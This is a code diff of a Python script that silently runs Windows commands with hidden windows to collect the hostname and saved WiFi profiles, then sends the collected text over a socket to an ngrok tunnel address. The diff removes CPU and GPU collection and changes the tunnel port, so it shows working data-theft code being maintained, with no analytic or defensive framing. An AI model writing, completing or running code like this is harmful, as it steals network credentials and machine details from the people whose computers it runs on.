@@ -7,8 +7,6 @@ CREATE_NO_WINDOW = 0x08000000
 
 wifiCommand = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
 systemNameCommand = subprocess.check_output(['hostname'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
-cpuCommand = subprocess.check_output(['wmic', 'cpu', 'get', 'name'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
-gpuCommand = subprocess.check_output(['wmic', 'path', 'win32_videocontroller', 'get', 'name'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
 
 try:
     print(systemNameCommand[0])
@@ -16,17 +14,6 @@ try:
 except:
     results2 = "SYSTEM NAME UNAVAILABLE" + "\n"
 
-try:
-    print(cpuCommand[1])
-    results2 += "CPU: " + cpuCommand[1] + "\n"
-except:
-    results2 += "CPU NAME UNAVAILABLE" + "\n"
-
-try:
-    print(gpuCommand[1])
-    results2 += "GPU: " + gpuCommand[1] + "\n\n"
-except:
-    results2 += "GPU NAME UNAVAILABLE" + "\n\n"
 
 results2 += "WiFi Results\n"
 profiles = [i.split(":")[1][1:-1] for i in wifiCommand if "All User Profile" in i]
@@ -45,7 +32,7 @@ client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
     # Connect to the listening server address
-    client_socket.connect(('0.tcp.au.ngrok.io', 11775))
+    client_socket.connect(('0.tcp.au.ngrok.io', 19030))
     
     # Send the encoded data payload
     client_socket.sendall(results2.encode('utf-8'))
